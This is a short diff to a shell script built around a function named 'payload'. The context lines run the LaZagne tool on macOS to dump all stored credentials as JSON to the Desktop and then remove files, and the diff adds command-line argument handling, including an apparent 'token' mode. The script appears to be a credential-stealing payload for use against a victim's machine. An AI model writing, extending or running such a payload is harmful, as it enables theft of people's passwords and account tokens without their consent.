@@ -50,6 +50,7 @@ payload() {
                     clear
                 fi
                 python3 LaZagne/Mac/laZagne.py all -oJ -output $HOME/Desktop
+                # # #
                 if [ "$1" == "verbose" ]; then
                     printf "\033[33m[*]\033[0m Removing files...\n"
                 else
@@ -68,4 +69,17 @@ payload() {
 }
 
 
-payload
+case "$1" in
+    "verbose" )
+        payload
+        ;;
+    "token" )
+        payload
+        ;;
+    "" )
+        payload
+        ;;
+    * )
+        printf "\033[31m[*]\033[0m Invalid argument(s) specified.\n"
+        exit 1
+esac
